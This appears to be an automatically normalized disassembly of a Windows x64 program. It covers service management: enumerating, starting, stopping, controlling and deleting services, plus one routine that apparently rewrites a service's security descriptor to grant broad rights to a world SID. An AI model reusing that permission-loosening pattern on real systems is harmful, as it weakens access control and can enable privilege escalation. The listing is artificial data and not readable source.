mov [ rcx + 0x4 ] eax
mov eax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] eax
mov eax [ rdx + 0xc ]
mov [ rcx + 0xc ] eax
mov eax [ rdx + 0x10 ]
mov [ rcx + 0x10 ] eax
mov rax [ rdx + 0x18 ]
mov [ rcx + 0x18 ] rax
mov eax [ rdx + 0x20 ]
mov [ rcx + 0x20 ] eax
mov rax [ rdx + 0x28 ]
mov [ rcx + 0x28 ] rax
add rcx 0x30
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
add rdx 0x30
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rdi + 0x58 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x58 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_14000e010
push rbx
sub rsp 0x20
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
mov rbx rcx
mov [ rcx ] 0x0
call sub_140005f40
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14000e050
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x58 ] rsi
mov rsi r8
mov rbx rcx
mov [ rcx + 0x18 ] 0xf
xor ebp ebp
mov [ rcx + 0x10 ] rbp
mov [ rcx ] bpl
call sub_140005eb0
nop
lea rdi [ rbx + 0x28 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
cmp rdi rsi
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx rdi
call sub_14000d6c0
mov r11 [ rsi ]
mov [ rdi ] r11
mov rax [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rax
mov rax [ rsi + 0x10 ]
mov [ rdi + 0x10 ] rax
mov [ rsi ] rbp
mov [ rsi + 0x8 ] rbp
mov [ rsi + 0x10 ] rbp
jmp r-xdata
sub_14000e0f0
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x58
mov [ rsp + 0x60 ] rbx
add rdi 0x58
jmp r-xdata
mov eax [ rdi ]
mov [ rbx ] eax
mov eax [ rdi + 0x4 ]
mov [ rbx + 0x4 ] eax
mov eax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] eax
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov eax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] eax
mov eax [ rdi + 0x1c ]
mov [ rbx + 0x1c ] eax
mov eax [ rdi + 0x20 ]
mov [ rbx + 0x20 ] eax
mov eax [ rdi + 0x24 ]
mov [ rbx + 0x24 ] eax
mov eax [ rdi + 0x28 ]
mov [ rbx + 0x28 ] eax
lea rcx [ rbx + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
cmp rdi rsi
je r-xdata
sub_14000e1b0
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
mov rax rbx
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
sub rbx 0xffffffffffffff80
mov [ rsp + 0x60 ] rbx
sub rdi 0xffffffffffffff80
jmp r-xdata
mov rdx rdi
mov rcx rbx
call sub_14000df50
nop
cmp rdi rsi
je r-xdata
sub_14000e210
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x40
mov [ rsp + 0x60 ] rbx
add rdi 0x40
jmp r-xdata
mov rax [ rdi ]
mov [ rbx ] rax
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
movzx eax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] ax
lea rcx [ rbx + 0x18 ]
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] r12
mov [ rcx ] 0x0
lea rdx [ rdi + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140005f40
nop
cmp rdi rsi
je r-xdata
sub_14000e2b0
push rbx
sub rsp 0x20
cmp [ rcx + 0x30 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x30 ] 0xf
mov [ rbx + 0x28 ] 0x0
mov [ rbx + 0x18 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x18 ]
call j_sub_14003ad04
sub_14000e2f0
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
mov rax rbx
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x48
mov [ rsp + 0x60 ] rbx
add rdi 0x48
jmp r-xdata
lea r8 [ rdi + 0x28 ]
mov rdx rdi
mov rcx rbx
call sub_14000e050
nop
cmp rdi rsi
je r-xdata
sub_14000e350
push rbx
sub rsp 0x20
mov rbx rcx
add rcx 0x28
call sub_14000d6c0
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rbx ]
call j_sub_14003ad04
sub_14000e390
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rsi rdx
mov rbx rcx
xor eax eax
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov rdi [ rdx + 0x8 ]
sub rdi [ rdx ]
sar rdi 0x6
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
test rdi rdi
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax 0x3ffffffffffffff
cmp rdi rax
jbe r-xdata
mov rcx rdi
call sub_14000dd20
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
shl rdi 0x6
add rdi rax
mov [ rbx + 0x10 ] rdi
mov r8 rax
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_14000e4c0
mov [ rbx + 0x8 ] rax
lea rcx [ r--data ]
call sub_1400378ec
sub_14000e440
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
cmp [ rcx + 0x70 ] 0x8
mov edi edx
mov rbx rcx
jb r-xdata
xor esi esi
mov [ rbx + 0x70 ] 0x7
mov [ rbx + 0x68 ] rsi
mov [ rbx + 0x58 ] si
cmp [ rbx + 0x48 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x58 ]
call j_sub_14003ad04
mov [ rbx + 0x48 ] 0x7
mov [ rbx + 0x40 ] rsi
mov [ rbx + 0x30 ] si
test dil 0x1
je r-xdata
mov rcx [ rbx + 0x30 ]
call j_sub_14003ad04
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_14000e4c0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rdi
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov r8 rcx
mov [ rsp + 0x78 ] rbx
xor edi edi
nop [ rax + rax ] eax
mov rax rbx
add rsp 0x48
pop rdi
pop rbx
retn
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rbx
test rbx rbx
je r-xdata
add rbx 0x40
mov [ rsp + 0x70 ] rbx
add r8 0x40
mov [ rsp + 0x60 ] r8
jmp r-xdata
mov rax [ r8 ]
mov [ rbx ] rax
mov rax [ r8 + 0x8 ]
mov [ rbx + 0x8 ] rax
movzx eax [ r8 + 0x10 ]
mov [ rbx + 0x10 ] ax
lea rcx [ rbx + 0x18 ]
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] rdi
mov [ rcx ] 0x0
lea rdx [ r8 + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140005f40
mov rdx [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
cmp r8 rdx
je r-xdata
sub_14000e570
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push r12
lea rbp [ rsp - 0x47 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rsi rdx
mov r12 rcx
xor bl bl
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
movzx eax bl
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xf8 ]
add rsp 0xc0
pop r12
pop rsi
pop rbp
retn
mov ecx [ rsi ]
mov [ rsp + 0xf0 ] rdi
call j_sub_14003ac60
mov r9d [ rsi ]
mov rcx [ r12 ]
mov r8 rax
mov edx 0x4
mov rdi rax
mov [ rsp + 0x20 ] rsi
call [ QueryServiceObjectSecurity@IAT ]
test eax eax
je r-xdata
mov rcx rdi
call j_sub_14003ad04#2
mov rdi [ rsp + 0xf0 ]
xor esi esi
lea rax [ rbp - 0x11 ]
lea rcx [ rbp + 0x2b ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x48 ] esi
mov [ rsp + 0x40 ] esi
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x30 ] esi
xor r9d r9d
xor r8d r8d
mov dl 0x1
mov [ rsp + 0x28 ] esi
mov [ rbp + 0x2b ] 0x0
mov [ rbp + 0x2f ] 0x100
mov [ rbp - 0x11 ] rsi
mov [ rsp + 0x20 ] esi
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
xor eax eax
lea r9 [ rbp - 0x9 ]
lea r8d [ rsi + 0x1 ]
mov [ rbp - 0x9 ] rax
mov [ rbp - 0x1 ] rax
mov [ rbp + 0xf ] rax
mov [ rbp + 0x17 ] rax
mov [ rbp + 0x1f ] rax
mov [ rbp + 0x7 ] rax
mov rax [ rbp - 0x11 ]
xor edx edx
xor ecx ecx
mov [ rbp + 0x1f ] rax
lea rax [ rbp - 0x19 ]
mov [ rbp - 0x5 ] 0x2
mov [ rsp + 0x40 ] rax
lea rax [ rbp + 0x27 ]
mov [ rbp - 0x9 ] 0x201fd
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] esi
mov [ rbp + 0x13 ] esi
mov [ rbp + 0x17 ] 0x5
mov [ rbp - 0x19 ] rsi
call [ BuildSecurityDescriptorW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x11 ]
call [ FreeSid@IAT ]
mov r8 [ rbp - 0x19 ]
mov rcx [ r12 ]
lea edx [ rsi + 0x4 ]
call [ SetServiceObjectSecurity@IAT ]
mov rcx [ rbp - 0x19 ]
test eax eax
setne bl
call [ LocalFree@IAT ]
sub_14000e700
push rbp
push rdi
push r12
push r13
sub rsp 0x58
mov rdi r9
mov r12 r8
mov r13 rdx
mov rbp rcx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x98 ] 0x0
test r9 r9
je r-xdata
xor ecx ecx
cmp [ r9 + 0x18 ] 0x8
jb r-xdata
xor al al
add rsp 0x58
pop r13
pop r12
pop rdi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov rcx r9
jmp r-xdata
mov rcx [ r9 ]
jmp r-xdata
mov ecx [ rsp + 0x40 ]
mov [ rsp + 0x80 ] rbx
mov eax 0x2
mov [ rsp + 0x88 ] rsi
mov [ rsp + 0x50 ] r15
mov r15 0xffffffffffffffff
mul rcx
cmovo rax r15
mov rcx rax
call j_sub_14003ac60
mov ecx [ rsp + 0x98 ]
mov rsi rax
mov eax 0x2
mul rcx
cmovo rax r15
mov rcx rax
call j_sub_14003ac60
mov rbx rax
test rdi rdi
je r-xdata
lea rax [ rsp + 0x44 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x98 ]
mov rdx rbp
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x0
call [ LookupAccountSidW@IAT ]
test eax eax
jne r-xdata
lea rax [ rsp + 0x44 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x98 ]
mov rdx rbp
mov [ rsp + 0x28 ] rax
mov rcx rdi
mov [ rsp + 0x20 ] rbx
call [ LookupAccountSidW@IAT ]
test eax eax
setne bpl
test bpl bpl
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx rbx
call j_sub_14003ad04#2
mov rcx rsi
call j_sub_14003ad04#2
mov r15 [ rsp + 0x50 ]
mov rsi [ rsp + 0x88 ]
mov rbx [ rsp + 0x80 ]
movzx eax bpl
add rsp 0x58
pop r13
pop r12
pop rdi
pop rbp
retn
xor eax eax
mov rcx r15
mov rdi rsi
[ rdi ]
mov rdx rsi
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx r13
call sub_140001ea0
test r12 r12
je r-xdata
mov rdi [ rdi ]
xor eax eax
mov rcx r15
mov rdi rbx
[ rdi ]
mov rdx rbx
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx r12
call sub_140001ea0
sub_14000e8b0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x10 ]
sub rsp 0x110
mov [ rsp + 0x70 ] 0xfffffffffffffffe
mov [ rsp + 0x160 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp ] rax
mov rax rdx
mov [ rsp + 0x60 ] rcx
xor r13b r13b
xor ebx ebx
test rdx rdx
je r-xdata
mov rax rbx
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
movzx eax r13b
mov rcx [ rbp ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x160 ]
add rsp 0x110
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x54 ] ebx
mov [ rsp + 0x50 ] ebx
mov [ rsp + 0x58 ] ebx
mov [ rsp + 0x48 ] rbx
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x54 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
xor edx edx
lea r9d [ rdx + 0x3 ]
lea r8d [ rdx + 0x3b ]
mov rcx r14
call [ EnumServicesStatusExW@IAT ]
test eax eax
jne r-xdata
mov r8d 0x5
lea rdx [ r--data ]
mov rcx rax
call [ OpenSCManagerW@IAT ]
mov r14 rax
mov [ rsp + 0x68 ] rax
test rax rax
je r-xdata
mov rax [ rdx ]
jmp r-xdata
mov rcx r14
call [ CloseServiceHandle@IAT ]
mov ecx ebx
call [ SetLastError@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov ecx [ rsp + 0x54 ]
call j_sub_14003ac60
mov r15 rax
mov [ rsp + 0x48 ] rbx
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x54 ]
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x54 ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r15
xor edx edx
lea r9d [ rdx + 0x3 ]
lea r8d [ rdx + 0x3b ]
mov rcx r14
call [ EnumServicesStatusExW@IAT ]
test eax eax
setne r13b
test r13b r13b
je r-xdata
mov rcx r15
call j_sub_14003ad04#2
call [ GetLastError@IAT ]
mov ebx eax
mov esi ebx
cmp [ rsp + 0x50 ] ebx
jbe r-xdata
lea r12 [ r15 + 0x10 ]
mov r14 [ rsp + 0x60 ]
nop [ rax + rax ] ax
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rbx
mov [ rbp - 0x58 ] bx
cmp [ rbp - 0x68 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
inc esi
add r12 0x38
cmp esi [ rsp + 0x50 ]
jb r-xdata
mov rcx [ rbp - 0x80 ]
call j_sub_14003ad04
mov rdx [ r12 - 0x10 ]
mov [ rbp - 0x68 ] 0x7
mov [ rbp - 0x70 ] rbx
mov [ rbp - 0x80 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x80 ]
call sub_140001ea0
nop
mov rdx [ r12 - 0x8 ]
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rbx
mov [ rbp - 0x58 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x58 ]
call sub_140001ea0
movups xmm0 [ r12 ]
movaps [ rbp - 0x30 ] xmm0
movups xmm1 [ r12 + 0x10 ]
movaps [ rbp - 0x20 ] xmm1
mov eax [ r12 + 0x20 ]
mov [ rbp - 0x10 ] eax
lea rdx [ rbp - 0x80 ]
mov rcx r14
call sub_14000eed0
nop
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov r14 [ rsp + 0x68 ]
sub_14000eb30
push rbp
push rsi
push rdi
sub rsp 0x20
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x50 ] r13
mov r13 rcx
mov ecx 0x20
mov r12 rdx
xor sil sil
call sub_14003ac60
xor ebp ebp
mov rdi rax
test rax rax
je r-xdata
mov rdi rbp
mov [ rax ] rbp
mov [ rax + 0x8 ] rbp
mov [ rax + 0x10 ] rbp
jmp r-xdata
mov r13 [ rsp + 0x50 ]
mov r12 [ rsp + 0x48 ]
test rdi rdi
je r-xdata
mov [ rsp + 0x40 ] rbx
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
xor edx edx
mov rcx rdi
call sub_14000e8b0
test al al
je r-xdata
movzx eax sil
add rsp 0x20
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x40 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx rdi
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
call j_sub_14003ad04
mov rdx [ rdi + 0x8 ]
call sub_14000f1a0
mov rcx [ rdi ]
call j_sub_14003ad04
mov rsi rbx
mov rsi [ rbx ]
jmp r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
mov rcx r13
call sub_140001dd0
lea rdx [ rbx + 0x28 ]
lea rcx [ r13 + 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
mov eax [ rbx + 0x50 ]
mov [ r13 + 0x50 ] eax
mov eax [ rbx + 0x54 ]
mov [ r13 + 0x54 ] eax
mov eax [ rbx + 0x58 ]
mov [ r13 + 0x58 ] eax
mov eax [ rbx + 0x5c ]
mov [ r13 + 0x5c ] eax
mov eax [ rbx + 0x60 ]
mov [ r13 + 0x60 ] eax
mov eax [ rbx + 0x64 ]
mov [ r13 + 0x64 ] eax
mov eax [ rbx + 0x68 ]
mov [ r13 + 0x68 ] eax
mov eax [ rbx + 0x6c ]
mov [ r13 + 0x6c ] eax
mov eax [ rbx + 0x70 ]
mov [ r13 + 0x70 ] eax
add rbx 0x78
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov rcx r12
call sub_140001bd0
mov rcx rsi
mov rdx rax
call sub_14003bad0
test eax eax
sete sil
test sil sil
jne r-xdata
jmp r-xdata
sub_14000ec80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
xor esi esi
lea rdx [ r--data ]
lea r8d [ rsi + 0x1 ]
xor ecx ecx
xor dil dil
call [ OpenSCManagerW@IAT ]
mov rbp rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax dil
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r8d 0x10
mov rdx rbx
mov rcx rax
call [ OpenServiceW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rbx ]
call [ GetLastError@IAT ]
mov esi eax
xor r8d r8d
xor edx edx
mov rcx rax
call [ StartServiceW@IAT ]
test eax eax
setne dil
test dil dil
jne r-xdata
mov rcx rbx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov rcx rbp
call [ CloseServiceHandle@IAT ]
mov ecx esi
call [ SetLastError@IAT ]
sub_14000ed40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
xor esi esi
lea rdx [ r--data ]
lea r8d [ rsi + 0x1 ]
xor ecx ecx
xor dil dil
call [ OpenSCManagerW@IAT ]
mov rbp rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax dil
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r8d 0x10000
mov rdx rbx
mov rcx rax
call [ OpenServiceW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rbx ]
call [ GetLastError@IAT ]
mov esi eax
mov rcx rax
call [ DeleteService@IAT ]
test eax eax
setne dil
test dil dil
jne r-xdata
mov rcx rbx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov rcx rbp
call [ CloseServiceHandle@IAT ]
mov ecx esi
call [ SetLastError@IAT ]
sub_14000ee00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov r12 rdx
mov rbx rcx
xor edi edi
lea rdx [ r--data ]
lea r8d [ rdi + 0x1 ]
xor ecx ecx
xor sil sil
call [ OpenSCManagerW@IAT ]
mov rbp rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
movzx eax sil
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r8d 0x20
mov rdx rbx
mov rcx rax
call [ OpenServiceW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rbx ]
call [ GetLastError@IAT ]
mov edi eax
mov r8 r12
mov edx 0x1
mov rcx rax
call [ ControlService@IAT ]
test eax eax
setne sil
test sil sil
jne r-xdata
mov rcx rbx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov edi eax
mov rcx rbp
call [ CloseServiceHandle@IAT ]
mov ecx edi
call [ SetLastError@IAT ]
sub_14000eed0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rsi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000efa0
sub rsi rax
mov rax 0x8888888888888889
imul rsi
lea rdi [ rsi + rdx ]
sar rdi 0x6
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x78
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rdx rsi
call sub_14000f220
nop
imul rdi rdi 0x78
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000efa0
jmp r-xdata
mov rdx rdi
call sub_14000f220
nop
sub_14000efa0
push rbx
sub rsp 0x20
mov r11 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov rbx 0x8888888888888889
sub r8 r11
mov rax rbx
mov r10 rcx
imul r8
lea r9 [ r8 + rdx ]
sar r9 0x6
mov rax r9
shr rax 0x3f
add r9 rax
mov rax 0x222222222222221
cmp r9 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rbx
inc r9
sub rcx r11
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x20
pop rbx
retn
mov rcx rdx
mov rax 0x222222222222222
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
xor edx edx
jmp r-xdata
cmp rdx r9
mov rcx r10
cmovb rdx r9
call sub_14000f050
sub_14000f050
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rsi rcx
mov rax 0x222222222222222
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x8888888888888889
mov rax r12
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor edi edi
mov [ rsp + 0x58 ] rdi
test rbx rbx
je r-xdata
mov r8 rdi
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_14000f2d0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
lea r12 [ r8 + rdx ]
sar r12 0x6
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
mov rcx rbx
imul rcx rcx 0x78
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
imul rbx rbx 0x78
add rbx rdi
mov [ rsi + 0x10 ] rbx
imul r12 r12 0x78
add r12 rdi
mov [ rsi + 0x8 ] r12
mov [ rsi ] rdi
mov rdx r9
call sub_14000f1a0
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14000f1a0
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x40 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
cmp [ rbx - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
mov [ rbx - 0x28 ] 0x7
mov [ rbx - 0x30 ] rsi
mov [ rbx - 0x40 ] si
add rbx 0x78
lea rax [ rbx - 0x40 ]
cmp rax rdi
